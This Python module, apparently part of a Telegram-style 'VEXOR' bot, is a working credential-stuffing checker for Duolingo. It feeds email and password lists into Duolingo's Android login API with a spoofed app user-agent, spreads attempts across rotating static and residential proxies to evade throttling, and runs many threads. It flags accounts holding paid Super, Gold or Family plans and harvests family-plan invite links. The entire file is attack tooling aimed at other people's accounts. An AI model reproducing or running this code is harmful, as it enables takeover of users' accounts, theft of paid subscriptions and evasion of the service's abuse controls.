#!/usr/bin/env python3
"""Duolingo checker module for VEXOR bot — v3.3 Multi-Source Country + Family Plan Invites + Smart Proxy Cascade + Full Debug."""

import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
import json
import random
import re
import threading
import time
import uuid

import config
from config import (
    COUNTRY_NAMES,
    get_proxy_for_attempt,
    log,
    report_proxy_fail,
    report_proxy_ok,
    resolve_country_code as base_resolve_country_code,
)
import requests
from requests.adapters import HTTPAdapter
import urllib3
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── endpoints ───────────────────────────────────────────────
LOGIN_URL = (
    "https://android-api-cf.duolingo.com/2017-06-30/login"
    "?fields=id%2Clocation%2Ctimezone%2Ccountry%2CcountryCode%2Cname"
)
PROFILE_URL = "https://android-api-cf.duolingo.com/2023-05-23/users/{}"
FAMILY_PREFIX = "https://invite.duolingo.com/family-plan/"

FIELDS = (
    "adsConfig%7Bunits%7D%2Cid%2CbetaStatus%2Cbio%2CblockerUserIds%2CblockedUserIds"
    "%2CclassroomLeaderboardsEnabled%2CcoachOutfit%2Ccourses%7BalphabetsPathProgressKey"
    "%2Cid%2Csubject%2Ctopic%2Cxp%2CauthorId%2Ccrowns%2ChealthEnabled%2CfromLanguage"
    "%2ClearningLanguage%7D%2CcreationDate%2CcurrentCourseId%2Cemail%2CemailAnnouncement"
    "%2CemailFollow%2CemailPass%2CemailPromotion%2CemailResearch%2CemailStreakFreezeUsed"
    "%2CemailWeeklyProgressReport%2CemailWordOfTheDay%2CfacebookId%2CfeedbackProperties"
    "%2CfromLanguage%2CgemsConfig%7Bgems%2CgemsPerSkill%2CuseGems%7D"
    "%2CglobalAmbassadorStatus%7Blevel%2Ctypes%7D%2CgoogleId%2ChasFacebookId"
    "%2ChasGoogleId%2ChasPlus%2ChasRecentActivity15%2Chealth%7BeligibleForFreeRefill"
    "%2ChealthEnabled%2CuseHealth%2Chearts%2CmaxHearts%2CsecondsPerHeartSegment"
    "%2CsecondsUntilNextHeartSegment%2CnextHeartEpochTimeMs%2CunlimitedHeartsAvailable%7D"
    "%2CinviteURL%2CjoinedClassroomIds%2ClastResurrectionTimestamp%2ClearningLanguage"
    "%2Clingots%2CliteracyAdGroup%2Clocation%2Cname%2CobservedClassroomIds"
    "%2CoptionalFeatures%7Bid%2Cstatus%7D%2CpersistentNotifications%2CphoneNumber"
    "%2Cpicture%2CplusDiscounts%7BexpirationEpochTime%2CdiscountType"
    "%2CsecondsUntilExpiration%7D%2CpracticeReminderSettings%2CprivacySettings"
    "%2CpushAnnouncement%2CpushEarlyBird%2CpushNightOwl%2CpushFollow%2CpushLeaderboards"
    "%2CpushPassed%2CpushPromotion%2CpushStreakFreezeUsed%2CpushStreakSaver"
    "%2CpushSchoolsAssignment%2CpushResurrectRewards%2CreferralInfo%7BhasReachedCap"
    "%2CnumBonusesReady%2CunconsumedInviteeIds%2CunconsumedInviteeName%2CinviterName"
    "%2CisEligibleForBonus%2CisEligibleForOffer%7D%2CrequiresParentalConsent"
    "%2CrewardBundles%7Bid%2CrewardBundleType%2Crewards%7Bid%2Cconsumed%2CitemId"
    "%2Ccurrency%2Camount%2CrewardType%7D%7D%2Croles%2CshakeToReportEnabled"
    "%2CshouldForceConnectPhoneNumber%2CsmsAll%2CshopItems%7Bid%2CpurchaseDate"
    "%2CpurchasePrice%2Cquantity%2CsubscriptionInfo%7Bcurrency%2CexpectedExpiration"
    "%2CisFreeTrialPeriod%2CperiodLength%2Cprice%2CproductId%2Crenewer%2Crenewing"
    "%2CvendorPurchaseId%7D%2CwagerDay%2CexpectedExpirationDate%2CpurchaseId"
    "%2CremainingEffectDurationInSeconds%2CexpirationEpochTime%2CfamilyPlanInfo%7BownerId"
    "%2CsecondaryMembers%2CinviteToken%2CpendingInvites%7BfromUserId%2CtoUserId"
    "%2Cstatus%7D%7D%7D%2Cstreak%2CstreakData%7Blength%2CstartTimestamp%2CupdatedTimestamp"
    "%2CupdatedTimeZone%2CxpGoal%7D%2CsubscriptionConfigs%7BisInBillingRetryPeriod"
    "%2CisInGracePeriod%2CvendorPurchaseId%2CproductId%2CpauseStart%2CpauseEnd"
    "%2CreceiptSource%7D%2Ctimezone%2CtotalXp%2CtrackingProperties%2Cusername"
    "%2CxpGains%7Btime%2Cxp%2CeventType%2CskillId%7D%2CxpConfig%7BmaxSkillTestXp"
    "%2CmaxCheckpointTestXp%2CmaxPlacementTestXp%7D%2CxpGoal%2CzhTw"
    "%2CtimerBoostConfig%7BtimerBoosts%2CtimePerBoost%2ChasFreeTimerBoost%7D"
    "%2CenableSpeaker%2CenableMicrophone"
)

ANDROID_UA = (
    "Duodroid/5.141.7 Dalvik/2.1.0 (Linux; U; Android 9; "
    "SM-G955N Build/NRD90M.G955NKSU1AQDC)"
)

PLAN_FLAGS = [
    ("has_item_gold_subscription", "Duolingo Gold"),
    ("has_item_immersive_subscription", "Duolingo Immersive"),
    ("has_item_premium_subscription", "Duolingo Super/Plus"),
    ("has_item_live_subscription", "Duolingo Live"),
]

# ─── timezone → country (fallback when account location is empty) ──
TZ_COUNTRY = {
    "asia/dhaka": "BD", "asia/kolkata": "IN", "asia/calcutta": "IN",
    "asia/karachi": "PK", "asia/kathmandu": "NP", "asia/colombo": "LK",
    "asia/dubai": "AE", "asia/riyadh": "SA", "asia/qatar": "QA",
    "asia/kuwait": "KW", "asia/bahrain": "BH", "asia/muscat": "OM",
    "asia/tehran": "IR", "asia/baghdad": "IQ", "asia/beirut": "LB",
    "asia/amman": "JO", "asia/jerusalem": "IL", "asia/kabul": "AF",
    "asia/tokyo": "JP", "asia/seoul": "KR", "asia/shanghai": "CN",
    "asia/hong_kong": "HK", "asia/taipei": "TW", "asia/singapore": "SG",
    "asia/bangkok": "TH", "asia/jakarta": "ID", "asia/manila": "PH",
    "asia/ho_chi_minh": "VN", "asia/kuala_lumpur": "MY", "asia/yangon": "MM",
    "asia/phnom_penh": "KH", "asia/vientiane": "LA", "asia/brunei": "BN",
    "asia/ulaanbaatar": "MN", "asia/tashkent": "UZ", "asia/almaty": "KZ",
    "asia/baku": "AZ", "asia/yerevan": "AM", "asia/tbilisi": "GE",
    "europe/london": "GB", "europe/paris": "FR", "europe/berlin": "DE",
    "europe/madrid": "ES", "europe/rome": "IT", "europe/amsterdam": "NL",
    "europe/brussels": "BE", "europe/vienna": "AT", "europe/zurich": "CH",
    "europe/stockholm": "SE", "europe/oslo": "NO", "europe/copenhagen": "DK",
    "europe/helsinki": "FI", "europe/dublin": "IE", "europe/warsaw": "PL",
    "europe/prague": "CZ", "europe/budapest": "HU", "europe/bucharest": "RO",
    "europe/sofia": "BG", "europe/athens": "GR", "europe/lisbon": "PT",
    "europe/moscow": "RU", "europe/kiev": "UA", "europe/kyiv": "UA",
    "europe/istanbul": "TR", "europe/belgrade": "RS", "europe/zagreb": "HR",
    "europe/ljubljana": "SI", "europe/bratislava": "SK", "europe/vilnius": "LT",
    "europe/riga": "LV", "europe/tallinn": "EE", "europe/reykjavik": "IS",
    "europe/luxembourg": "LU", "europe/malta": "MT", "europe/nicosia": "CY",
    "america/new_york": "US", "america/chicago": "US", "america/denver": "US",
    "america/los_angeles": "US", "america/phoenix": "US", "america/anchorage": "US",
    "america/detroit": "US", "america/indianapolis": "US", "america/boise": "US",
    "pacific/honolulu": "US", "america/toronto": "CA", "america/vancouver": "CA",
    "america/montreal": "CA", "america/edmonton": "CA", "america/winnipeg": "CA",
    "america/mexico_city": "MX", "america/sao_paulo": "BR",
    "america/argentina/buenos_aires": "AR", "america/santiago": "CL",
    "america/bogota": "CO", "america/lima": "PE", "america/caracas": "VE",
    "america/guayaquil": "EC", "america/montevideo": "UY",
    "america/asuncion": "PY", "america/la_paz": "BO",
    "africa/cairo": "EG", "africa/lagos": "NG", "africa/johannesburg": "ZA",
    "africa/nairobi": "KE", "africa/casablanca": "MA", "africa/algiers": "DZ",
    "africa/tunis": "TN", "africa/accra": "GH", "africa/addis_ababa": "ET",
    "africa/khartoum": "SD", "africa/tripoli": "LY", "africa/dar_es_salaam": "TZ",
    "africa/kinshasa": "CD", "africa/luanda": "AO", "africa/harare": "ZW",
    "africa/lusaka": "ZM", "africa/maputo": "MZ", "africa/antananarivo": "MG",
    "australia/sydney": "AU", "australia/melbourne": "AU",
    "australia/brisbane": "AU", "australia/perth": "AU",
    "australia/adelaide": "AU", "pacific/auckland": "NZ",
}

TIMEOUT = 20
MAX_ATTEMPTS = 4  # 0: Static #1, 1: Static #2, 2: Res SID #1, 3: Res SID #2


def _dbg(email, stage, proxy_lbl="", status_code=None, text=None, exc=None):
  parts = [f"[{email}] STAGE={stage}"]
  if proxy_lbl:
    parts.append(f"PROXY={proxy_lbl}")
  if status_code is not None:
    parts.append(f"HTTP={status_code}")
  if exc is not None:
    parts.append(f"EXC={type(exc).__name__}({exc})")
  if text is not None:
    snippet = text.strip()[:350].replace("\n", " ")
    parts.append(f"BODY={snippet!r}")
  log("duolingo-dbg", " | ".join(parts), level="DEBUG")


def _resolve_raw_country(raw):
  """Turn 'US', 'United States', 'Dhaka, Bangladesh', 'US-CA' -> 'BD' etc."""
  if not raw or not isinstance(raw, str):
    return ""
  s = raw.strip()
  if not s:
    return ""
  if len(s) == 2 and s.isalpha():
    return "GB" if s.upper() == "UK" else s.upper()
  if "-" in s:
    head = s.split("-")[0].strip()
    if len(head) == 2 and head.isalpha():
      return "GB" if head.upper() == "UK" else head.upper()
  low = s.lower()
  for code, name in COUNTRY_NAMES.items():
    if low == name.lower():
      return code
  for code, name in COUNTRY_NAMES.items():
    if low.endswith(", " + name.lower()) or low.endswith(" " + name.lower()):
      return code
  for name_lower, code in sorted(
      ((n.lower(), k) for k, n in COUNTRY_NAMES.items()),
      key=lambda x: -len(x[0]),
  ):
    if len(name_lower) >= 4 and name_lower in low:
      return code
  return ""


def _tz_to_country(tz):
  if not tz or not isinstance(tz, str):
    return ""
  return TZ_COUNTRY.get(tz.strip().lower(), "")


def _deep_find(obj, key):
  if isinstance(obj, dict):
    for k, v in obj.items():
      if k == key:
        return v
      found = _deep_find(v, key)
      if found is not None:
        return found
  elif isinstance(obj, list):
    for item in obj:
      found = _deep_find(item, key)
      if found is not None:
        return found
  return None


def _fmt_epoch(v):
  try:
    n = float(v)
  except (TypeError, ValueError):
    return str(v) if v is not None else "N/A"
  if n > 1e12:
    n /= 1000.0
  try:
    dt = datetime.fromtimestamp(n, tz=timezone.utc)
    days = int((n - time.time()) / 86400)
    return dt.strftime("%Y-%m-%d"), days
  except (OverflowError, OSError, ValueError):
    return str(v), -1


def _build_session(proxy_url=None):
  s = requests.Session()
  retry = Retry(
      total=0,
      connect=0,
      read=0,
      status=0,
      allowed_methods=frozenset(["GET", "POST"]),
  )
  adapter = HTTPAdapter(
      max_retries=retry,
      pool_connections=64,
      pool_maxsize=64,
      pool_block=False,
  )
  s.mount("https://", adapter)
  s.mount("http://", adapter)
  s.headers.update({
      "user-agent": ANDROID_UA,
      "accept": "application/json",
      "accept-encoding": "gzip",
  })
  if proxy_url:
    if not proxy_url.startswith(("http://", "https://", "socks5://", "socks4://")):
      proxy_url = f"http://{proxy_url}"
    s.proxies = {"http": proxy_url, "https": proxy_url}
  s.verify = False
  s.trust_env = False
  return s


def _extract_country(email, login_json, profile_json, profile_src, extra_headers):
  """Multi-source country resolution: login fields -> profile fields -> regex -> timezone -> email TLD -> cf header."""
  # 1. Direct login fields
  for key in ("location", "country", "countryCode"):
    code = _resolve_raw_country(login_json.get(key) if login_json else None)
    if code:
      return code, f"login.{key}"

  # 2. Profile fields
  if isinstance(profile_json, dict):
    for key in ("location", "country", "countryCode"):
      code = _resolve_raw_country(profile_json.get(key))
      if code:
        return code, f"profile.{key}"

  # 3. Regex on raw profile JSON
  if profile_src:
    for pat in (
        r'"location"\s*:\s*"([^"]{2,40})"',
        r'"country"\s*:\s*"([^"]{2,40})"',
        r'"countryCode"\s*:\s*"([^"]{2,10})"',
    ):
      m = re.search(pat, profile_src)
      if m:
        code = _resolve_raw_country(m.group(1))
        if code:
          return code, "profile.regex"

  # 4. Timezone -> Country map
  for tz_src in (
      login_json.get("timezone") if login_json else None,
      profile_json.get("timezone") if isinstance(profile_json, dict) else None,
  ):
    code = _tz_to_country(tz_src)
    if code:
      return code, "timezone"

  # 5. Email domain / TLD country resolution
  email_cc = base_resolve_country_code(email)
  if email_cc and email_cc != "UNK":
    return email_cc, "email_tld"

  # 6. Cloudflare geolocation header fallback
  for hdr_src in (
      extra_headers.get("cf_ipcountry") if extra_headers else None,
      login_json.get("cf_ipcountry") if login_json else None,
  ):
    if hdr_src and len(hdr_src) == 2 and hdr_src.isalpha() and hdr_src.upper() != "XX":
      return hdr_src.upper(), "cf-ip"

  return "UNK", "none"


def _single_attempt(email, password, proxy_url, proxy_lbl):
  """Run one Duolingo check attempt using the specified proxy."""
  session = _build_session(proxy_url)
  try:
    payload = {
        "distinctId": str(uuid.uuid4()),
        "identifier": email,
        "password": password,
    }
    headers = {
        "user-agent": ANDROID_UA,
        "accept": "application/json",
        "x-amzn-trace-id": "User=0",
        "content-type": "application/json",
    }
    r = session.post(
        LOGIN_URL, data=json.dumps(payload), headers=headers, timeout=TIMEOUT
    )
    _dbg(
        email,
        "LOGIN",
        proxy_lbl=proxy_lbl,
        status_code=r.status_code,
        text=r.text,
    )

    if r.status_code == 401 or (r.text or "").strip() == "{}":
      return "bad", {}
    if r.status_code == 429 or "<!doctype html>" in (r.text or "")[:80].lower():
      return "retry", {}
    if r.status_code != 200 or '"id"' not in (r.text or ""):
      if r.status_code in (400, 403):
        return "bad", {}
      return "net", {}

    try:
      j = r.json()
      uid = j.get("id")
    except ValueError:
      return "net", {}
    if not uid:
      return "bad", {}

    tk = r.headers.get("jwt") or session.cookies.get("jwt")
    ck = session.cookies.get("wuuid")
    login_json = {
        "location": j.get("location"),
        "country": j.get("country"),
        "countryCode": j.get("countryCode"),
        "timezone": j.get("timezone"),
    }
    cf = r.headers.get("cf-ipcountry")
    if cf:
      login_json["cf_ipcountry"] = cf

    # Fetch full user profile
    prof_headers = {
        "authorization": f"Bearer {tk}",
        "x-amzn-trace-id": f"User={uid}",
        "accept": "application/json",
        "cookie": f"wuuid={ck}",
    }
    prof_url = PROFILE_URL.format(uid) + f"?fields={FIELDS}"
    r_prof = session.get(prof_url, headers=prof_headers, timeout=TIMEOUT)
    _dbg(
        email,
        "PROFILE",
        proxy_lbl=proxy_lbl,
        status_code=r_prof.status_code,
        text=(r_prof.text or "")[:300],
    )

    if r_prof.status_code == 429:
      return "retry", {}
    if r_prof.status_code not in (200, 304):
      return "net", {}

    src = r_prof.text or ""
    extra = (
        {"cf_ipcountry": r_prof.headers.get("cf-ipcountry")}
        if r_prof.headers.get("cf-ipcountry")
        else {}
    )
    try:
      data = json.loads(src)
    except ValueError:
      data = {}

    country, country_src = _extract_country(
        email, login_json, data, src, extra
    )
    plans = [name for flag, name in PLAN_FLAGS if f'{flag}":true' in src]
    invite_token = _deep_find(data, "inviteToken")
    exp_raw = _deep_find(data, "expectedExpiration")
    renewing = _deep_find(data, "renewing")
    streak = data.get("streak", 0) if isinstance(data, dict) else 0
    total_xp = data.get("totalXp", 0) if isinstance(data, dict) else 0

    if exp_raw is not None:
      exp_res = _fmt_epoch(exp_raw)
      if isinstance(exp_res, tuple):
        exp_str, days_left = exp_res
      else:
        exp_str, days_left = str(exp_res), -1
    else:
      exp_str, days_left = "N/A", -1

    renew_str = (
        "Yes" if renewing is True else ("No" if renewing is False else "N/A")
    )

    info = {
        "country": country,
        "country_src": country_src,
        "renew": renew_str,
        "expiry": exp_str,
        "days": days_left,
        "streak": streak,
        "xp": total_xp,
        "invite": "",
    }

    if invite_token:
      info["plan"] = "Duolingo Family"
      info["invite"] = FAMILY_PREFIX + str(invite_token)
      _dbg(email, "HIT_FAMILY", proxy_lbl=proxy_lbl, text=str(info))
      return "hit", info

    if plans or (isinstance(data, dict) and data.get("hasPlus") is True):
      info["plan"] = ", ".join(plans) if plans else "Duolingo Super/Plus"
      _dbg(email, "HIT_SUPER", proxy_lbl=proxy_lbl, text=str(info))
      return "hit", info

    info["plan"] = "FREE"
    _dbg(email, "FREE", proxy_lbl=proxy_lbl, text=str(info))
    return "free", info

  except (requests.exceptions.Timeout, requests.exceptions.RequestException) as e:
    _dbg(email, "NET_ERR", proxy_lbl=proxy_lbl, exc=e)
    return "net", {}
  except Exception as e:
    _dbg(email, "EXCEPTION", proxy_lbl=proxy_lbl, exc=e)
    return "net", {}
  finally:
    session.close()


def check_account(email, password, job=None):
  """Check a Duolingo account using the 3-tier proxy cascade + quarantine:

  Attempt 0 -> Static Proxy #1
  Attempt 1 -> Static Proxy #2 (different IP)
  Attempt 2+ -> Residential Rotating Proxy (fresh SID IP each time)
  """
  prev_proxy = None
  retried = False
  last_res = "net"

  for attempt in range(MAX_ATTEMPTS):
    if job and job.cancelled:
      return "net", {}
    proxy_url, proxy_lbl = get_proxy_for_attempt(attempt, prev_proxy=prev_proxy)
    prev_proxy = proxy_url
    if attempt > 0:
      retried = True
      if job:
        with job.lock:
          job.retried += 1
      log(
          "duolingo-dbg",
          f"[{email}] RETRY attempt={attempt} switching to PROXY={proxy_lbl}",
          level="DEBUG",
      )

    res, details = _single_attempt(email, password, proxy_url, proxy_lbl)
    last_res = res

    if res in ("hit", "free", "bad"):
      report_proxy_ok(proxy_url)
      if retried and job:
        with job.lock:
          job.recovered += 1
      return res, details

    report_proxy_fail(proxy_url, reason=res)
    if res == "retry" and job:
      with job.lock:
        job.throttled += 1
    time.sleep(random.uniform(0.4, 1.0))

  log(
      "duolingo-dbg",
      f"[{email}] EXHAUSTED all {MAX_ATTEMPTS} attempts -> {last_res}",
      level="DEBUG",
  )
  return "net", {}


def run(job, reporter):
  """Run Duolingo v3.3 checker with chunked submission and watcher thread."""
  max_workers = getattr(config, "DUOLINGO_THREADS", 25)
  log(
      "duolingo",
      f"start chat={job.chat_id} combos={len(job.combos)} workers={max_workers}",
      level="INFO",
  )

  done_evt = threading.Event()

  def _watcher():
    while not done_evt.is_set():
      try:
        reporter()
      except Exception as e:
        log("duolingo", f"reporter: {e}", "WARN")
      done_evt.wait(3)

  threading.Thread(target=_watcher, daemon=True).start()

  def worker(combo):
    if job.cancelled:
      return
    email, password = combo[0], combo[1]
    result, details = check_account(email, password, job=job)

    with job.lock:
      job.processed += 1
      job.done_keys.add((email.lower(), password))

      if result == "hit":
        job.valid += 1
        job.valid_list.append((email, password, details))
      elif result == "free":
        job.free += 1
        job.free_list.append((email, password, details))
      elif result == "bad":
        job.bad += 1
      else:
        job.net += 1

  try:
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
      pending = set()
      for combo in job.combos:
        if job.cancelled:
          break
        while len(pending) >= max_workers * 2:
          done, pending = concurrent.futures.wait(
              pending, return_when=concurrent.futures.FIRST_COMPLETED
          )
          if job.cancelled:
            break
        if job.cancelled:
          break
        pending.add(executor.submit(worker, combo))

      for future in as_completed(pending):
        if job.cancelled:
          for fx in pending:
            fx.cancel()
          break
        try:
          future.result()
        except Exception as e:
          log("duolingo", f"Worker error: {e}", level="ERROR")
  finally:
    done_evt.set()
    try:
      reporter(force=True)
    except Exception:
      pass

  log(
      "duolingo",
      f"done chat={job.chat_id} valid={job.valid} free={job.free} "
      f"bad={job.bad} net={job.net} retried={job.retried} recovered={job.recovered}",
      "DONE",
  )
